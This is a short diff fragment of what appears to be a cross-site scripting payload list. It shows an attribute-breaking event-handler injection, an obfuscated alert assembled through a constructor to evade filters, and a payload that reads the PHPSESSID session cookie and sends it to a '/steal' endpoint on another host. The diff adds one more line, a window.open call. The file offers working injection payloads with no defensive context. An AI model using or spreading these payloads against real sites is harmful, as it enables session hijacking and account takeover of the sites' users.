@@ -12,3 +12,6 @@ aa"><onpointover="alert(1)"><input%20types="hidden"%20value="
 ;const img=new Image();img.src='http://192.168.0.2:5000/steal?PHPSESSID='+document.cookie.match(/PHPSESSID=([^;]+)/)[1];//'
 
 ;Boolean[%27constructor%27](%27al%27%2b%27er%27%2b%27t(1)%27)();
+
+
+;window.open("https://naver.com");
